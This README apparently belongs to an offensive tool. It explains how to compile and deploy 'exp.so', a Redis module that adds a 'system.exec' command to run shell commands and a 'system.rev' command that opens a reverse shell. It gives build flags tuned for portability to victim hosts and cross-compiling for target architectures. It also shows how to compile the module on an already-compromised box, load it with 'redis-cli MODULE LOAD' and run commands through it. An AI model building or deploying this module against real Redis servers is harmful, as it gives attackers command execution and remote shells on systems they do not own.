# Compiling exp.so

Redis RCE module that registers `system.exec` and `system.rev` commands. Drop-in replacement for the original n0b0dyCN module with crash bugs fixed.

## Quick Build

```bash
gcc -shared -fPIC -fno-stack-protector -nostartfiles -O2 -o exp.so exp.c
strip -s exp.so
```

That's it. No dependencies beyond `gcc` and the `redismodule.h` header (included in this repo).

## What You Need

- **gcc** — any version from the last decade works
- **redismodule.h** — the Redis Module SDK header, included alongside `exp.c`

On Debian/Ubuntu/Kali/Parrot if gcc isn't installed:

```bash
sudo apt install build-essential
```

## Build Flags Explained

| Flag | Why |
|---|---|
| `-shared` | Build as a shared library (.so) that Redis can load |
| `-fPIC` | Position-independent code — required for shared libraries |
| `-fno-stack-protector` | Avoids linking `__stack_chk_fail` which some minimal Redis containers lack |
| `-nostartfiles` | Don't link crt startup — Redis calls `RedisModule_OnLoad` directly |
| `-O2` | Optimization keeps the binary small and avoids debug-only GLIBC symbols |
| `strip -s` | Remove symbol table — shrinks from ~42KB to ~30KB |

## Getting redismodule.h

If you don't have it, pull it from the Redis source for whatever version your target runs:

```bash
# Redis 5.x
curl -sO https://raw.githubusercontent.com/redis/redis/5.0/src/redismodule.h

# Redis 6.x
curl -sO https://raw.githubusercontent.com/redis/redis/6.0/src/redismodule.h

# Redis 7.x
curl -sO https://raw.githubusercontent.com/redis/redis/7.0/src/redismodule.h
```

The header is forward-compatible, so a 5.0 header works fine against newer Redis. Use the oldest one that covers your needs for maximum portability.

## Cross-Compiling

If your attack box is a different architecture than the target:

```bash
# Target is 32-bit x86
sudo apt install gcc-multilib
gcc -m32 -shared -fPIC -fno-stack-protector -nostartfiles -O2 -o exp32.so exp.c

# Target is ARM64 (e.g., AWS Graviton, Raspberry Pi)
sudo apt install gcc-aarch64-linux-gnu
aarch64-linux-gnu-gcc -shared -fPIC -fno-stack-protector -nostartfiles -O2 -o exp-arm64.so exp.c

# Target is ARMv7 (32-bit ARM)
sudo apt install gcc-arm-linux-gnueabihf
arm-linux-gnueabihf-gcc -shared -fPIC -fno-stack-protector -nostartfiles -O2 -o exp-armhf.so exp.c
```

## Compile On Target

If you already have a shell and need to build the module on the box itself:

```bash
# Upload exp.c and redismodule.h, then:
cd /tmp
gcc -shared -fPIC -fno-stack-protector -nostartfiles -O2 -o exp.so exp.c
redis-cli MODULE LOAD /tmp/exp.so
redis-cli system.exec "id"
```

## Verify the Build

```bash
# Should say: ELF 64-bit LSB shared object, x86-64
file exp.so

# Should show RedisModule_OnLoad, DoCommand, RevShellCommand
objdump -T exp.so | grep -E 'OnLoad|DoCommand|RevShell'

# Check GLIBC version requirement (lower = runs on more targets)
objdump -p exp.so | grep GLIBC
```

## What the Module Does

Once loaded, Redis gets two new commands:

```
system.exec <command>       Run a shell command, return output
system.rev <ip> <port>      Fork a reverse shell to ip:port
```

The reverse shell forks properly so Redis stays alive after the connection.
